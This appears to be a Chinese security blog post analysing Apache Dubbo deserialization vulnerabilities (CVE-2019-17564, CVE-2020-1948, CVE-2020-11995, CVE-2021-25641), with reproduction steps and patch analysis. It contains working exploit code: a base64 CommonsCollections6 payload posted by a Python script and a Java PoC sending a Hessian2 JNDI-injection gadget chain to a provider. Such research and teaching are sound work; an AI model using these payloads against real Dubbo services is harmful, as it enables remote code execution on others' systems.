# Java安全-Dubbo
## What is Dubbo
Apache Dubbo 是高性能的Java RPC框架。
### RPC
远程过程调用，不同于RMI，一个面向过程，一个面向对象。
服务器A和B分别部署了一个应用，A想调用B的方法，但是它们的部署的应用不在同一个内存空间，就不能直接调用，所以
**需要通过网络来表达调用的语义和传达的数据。**
看一下Dubbo的基本工作原理
中间的通信协议使用dubbo协议。
先分清这几个角色
  * Container 服务运行的容器
  * Provider RPC服务提供方
  * Registry 注册中心
  * Consumer RPC服务消费者
  * Monitor 监控中心
调用关系说明:
首先容器开启并提供RPC服务，然后
  1. 服务提供者在启动时，向注册中心注册自己提供的服务。
  2. 服务消费者在启动时，向注册中心订阅自己所需的服务。
  3. 注册中心返回服务提供者地址列表给消费者，如果有变更，注册中心将基于长连接推送变更数据给消费者。
  4. 服务消费者，从提供者地址列表中，基于软负载均衡算法，选一台提供者进行调用，如果调用失败，再选另一台调用。
  5. 服务消费者和提供者，在内存中累计调用次数和调用时间，定时每分钟发送一次统计数据到监控中心。
### Zookeeper
Zookeeper 是Dubbo推荐使用的注册中心，安装参考
不开启集群
然后开启，Zookeeper注册中心。
### 分包
分包简单来说就是把服务中需要的接口和模型，以及异常都抽离出来放在一个API包里，这样更方便Consumer和Provider 来实现。
搭建参考
[https://github.com/apache/dubbo-samples/](https://github.com/apache/dubbo-samples/tree/master/dubbo-samples-zookeeper)
## CVE-2019-17564
### 简述
Apache
Dubbo在使用HTTP协议进行通信时，是直接使用了Spring框架的org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter类做远程调用的，而这个过程会读取POST请求的Body内容并进行反序列化操作，从而导致反序列化漏洞的存在进而RCE。
### 影响版本
### 复现分析
 中的 http 来做demo，
再添加一个cc依赖
打开zookeeper 然后运行 httpprovider，
可以看到dubbo的通信协议是http协议。
运行consumer，使用wireshark追一下tcp流
因为直接使用127.0.0.1 ，数据包回环，不经过网卡，简单设置一下路由规则就好。
    route add 192.168.1.6 mask 255.255.255.255 192.168.1.1 metric 1
    route delete 192.168.1.6 mask 255.255.255.255 192.168.1.1 metric 1
    Content-Type: application/x-java-serialized-object
用来指定java序列化的对象，尝试构造恶意的序列化数据，攻击provider本地的gadgets
`java -jar ysoserial.jar CommonsCollections6 calc|base64 -w0`
    import requests
    import base64
    url = "http://192.168.1.6:8081/org.apache.dubbo.samples.http.api.DemoService"
    payload = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg="
    payload = base64.b64decode(payload)
    headers = {"Content-Type": "application/x-java-serialized-object"}
    res = requests.post(url,headers=headers,data=payload)
    print(res.text)
从报错的调用栈其实就可以知道原因了
    org.springframework.remoting.rmi.RemoteInvocationSerializingExporter.doReadRemoteInvocation(RemoteInvocationSerializingExporter.java:147)
    org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter.readRemoteInvocation(HttpInvokerServiceExporter.java:121)
    org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter.readRemoteInvocation(HttpInvokerServiceExporter.java:100)
    org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter.handleRequest(HttpInvokerServiceExporter.java:79)
    org.apache.dubbo.rpc.protocol.http.HttpProtocol$InternalHandler.handle(HttpProtocol.java:216)
    org.apache.dubbo.remoting.http.servlet.DispatcherServlet.service(DispatcherServlet.java:61)
    javax.servlet.http.HttpServlet.service(HttpServlet.java:790)
    org.springframework.remoting.rmi.RemoteInvocationSerializingExporter#doReadRemoteInvocation
这里调用Java原生的反序列化，然后再检查类型抛出异常。
官方也给出了提示，不建议使用httpinvoker来暴露服务。
### 补丁分析
不再使用`org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter`
作为骨架处理http请求，而是使用`com.googlecode.jsonrpc4j.JsonRpcServer`
，调用其父类的`com.googlecode.jsonrpc4j.JsonRpcBasicServer#handle` 方法处理。数据传输使用json
来完成。
## CVE-2020-1948
### 简述
上面的漏洞说到的是dubbo中使用http协议中存在的反序列化问题，此部分则是分析默认的dubbo的原生协议，中存在的反序列化漏洞。
### 影响版本
    2.7.0 
dubbo协议中使用`hessian`序列化，所以，重点研究hessian的反序列化问题。
这篇文章中很详细的讲述了Java的序列化和反序列化机制，
Hessian是二进制的web service协议，官方对Java、Flash/Flex、Python、C++、.NET
C#等多种语言都进行了实现。Hessian和Axis、XFire都能实现web
service方式的远程方法调用，区别是Hessian是二进制协议，Axis、XFire则是SOAP协议，所以从性能上说Hessian远优于后两者，并且Hessian的JAVA使用方法非常简单。它使用Java语言接口定义了远程对象，集合了序列化/反序列化和RMI功能。
当然，这篇文章主要讨论Hessian 的反序列化的问题。
Hessian反序列化占用的空间比JDK反序列化结果小，Hessian序列化时间比JDK序列化耗时长，但Hessian反序列化很快。并且两者都是基于Field机制，没有调用getter、setter方法，同时反序列化时构造方法也没有被调用。
Hessian在基于RPC的调用中性能更好。
三梦师傅也很详细的分析了dubbo中hessian反序列化的流程，总结了满足条件的Gadgets
对其整理一下：
  1. 默认dubbo协议+hessian2序列化方式
  2. 序列化tcp包可随意修改方法参数反序列化的class
  3. 反序列化时先通过构造方法实例化，然后在反射设置字段值
  4. 构造方法的选择，只选择花销最小并且只有基本类型传入的构造方法
由此，想要rce，估计得找到以下条件的gadget clain：
  1. 有参构造方法
  2. 参数不包含非基本类型
  3. cost最小的构造方法并且全部都是基本类型或String
环境参考
修改 version
添加Rome依赖
先使用demo执行一下rpc调用
可以发现dubbo的协议格式。
文档写的很明确，
直接看body部分的序列化部分，
Dubbo version 和 Service name Service version 需要通过数据包可以直接看到，
然后修改指定方法的参数类型为map，加入一个满足条件的Gadgets，
payload如下
使用rome调用getter方法触发jndi注入的链子，
    package org.apache.dubbo.samples.basic;
    import com.rometools.rome.feed.impl.EqualsBean;
    import com.rometools.rome.feed.impl.ToStringBean;
    import com.sun.rowset.JdbcRowSetImpl;
    import marshalsec.util.Reflections;
    import org.apache.dubbo.common.io.Bytes;
    import org.apache.dubbo.common.serialize.Cleanable;
    import org.apache.dubbo.serialize.hessian.Hessian2ObjectOutput;
    import java.io.ByteArrayOutputStream;
    import java.io.OutputStream;
    import java.lang.reflect.Array;
    import java.lang.reflect.Constructor;
    import java.net.Socket;
    import java.util.HashMap;
    import java.util.Random;
    public class TestBasicConsumer {
        public static void main(String[] args) throws Exception{
            JdbcRowSetImpl rs = new JdbcRowSetImpl();
    //todo 此处填写ldap url
            rs.setDataSourceName("ldap://127.0.0.1:8087/xxx");
            rs.setMatchColumn("foo");
            Reflections.getField(javax.sql.rowset.BaseRowSet.class, "listeners").set(rs, null);
            ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, rs);
            EqualsBean root = new EqualsBean(ToStringBean.class, item);
            HashMap s = new HashMap<>();
            Reflections.setFieldValue(s, "size", 2);
            Class nodeC;
            try {
                nodeC = Class.forName("java.util.HashMap$Node");
            } catch (ClassNotFoundException e) {
                nodeC = Class.forName("java.util.HashMap$Entry");
            }
            Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
            nodeCons.setAccessible(true);
            Object tbl = Array.newInstance(nodeC, 2);
            Array.set(tbl, 0, nodeCons.newInstance(0, root, root, null));
            Array.set(tbl, 1, nodeCons.newInstance(0, root, root, null));
            Reflections.setFieldValue(s, "table", tbl);
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
    // header.
            byte[] header = new byte[16];
    // set magic number.
            Bytes.short2bytes((short) 0xdabb, header);
    // set request and serialization flag.
            header[2] = (byte) ((byte) 0x80 | 2);
    // set request id.
            Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
            ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
            Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);
            out.writeUTF("2.0.2");
    //todo 此处填写注册中心获取到的service全限定名、版本号、方法名
            out.writeUTF("org.apache.dubbo.samples.basic.api.DemoService");
            out.writeUTF("0.0.0");
            out.writeUTF("sayHello");
    //todo 方法描述不需要修改，因为此处需要指定map的payload去触发
            out.writeUTF("Ljava/util/Map;");
            out.writeObject(s);
            out.writeObject(new HashMap());
            out.flushBuffer();
            if (out instanceof Cleanable) {
                ((Cleanable) out).cleanup();
            }
            Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
            byteArrayOutputStream.write(header);
            byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());
            byte[] bytes = byteArrayOutputStream.toByteArray();
    //todo 此处填写被攻击的dubbo服务提供者地址和端口
            Socket socket = new Socket("192.168.1.4", 20880);
            OutputStream outputStream = socket.getOutputStream();
            outputStream.write(bytes);
            outputStream.flush();
            outputStream.close();
        }
    }
上面的漏洞问题出在哪里？
明明接口方法的参数类型是String，却可以通过协议的漏洞来伪造一个Map类型的恶意类进而触发hashcode或者equals方法的反序列化。
### 补丁分析
`org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation#decode(org.apache.dubbo.remoting.Channel,
java.io.InputStream)`
修复方法是加了层判断，
## CVE-2020-11995
### 简述
上面漏洞的绕过版本，根本原因还是考虑泛型调用，兼容性。所以可以修改方法名来绕过达到反序列化的目的，泛型调用下面会说。
### 影响版本
    Dubbo 2.7.0 ~ 2.7.8
    Dubbo 2.6.0 ~ 2.6.8
    Dubbo 所有 2.5.x 版本
poc 就是把上面的方法名换成下面三个任意
### 补丁分析
又加了判断，
算是没有办法绕过了，此处的参数类型强制指定为泛型调用时的。
## CVE-2021-25641
### 简述
Dubbo服务在没有配置协议的情况下，默认使用dubbo协议，dubbo协议默认使用hessian2进行序列化传输对象。hessian2反序列化只是其中一个攻击面，太局限，而且hessian2可能会提供黑白名单的限制。所以需要尝试扩展攻击面，此漏洞应运而生。
### 影响版本
    基础  dubbo-common <=2.7.3
    Dubbo 2.7.0 to 2.7.8
    Dubbo 2.6.0 to 2.6.9
    Dubbo all 2.5.x versions (not supported by official team any longer)
### 复现分析
需要添加dubbo-common 依赖，
可以修改dubbo协议的
位来更改序列化方式为Kryo或者FST序列化格式。
通过id索引序列化器，当id为8时使用Kryo，id为9时使用Fst，
kryo 和 fst 的调用链都比较类似，使用map序列化器反序列化时，触发
继而调用hashcode 或者 equals，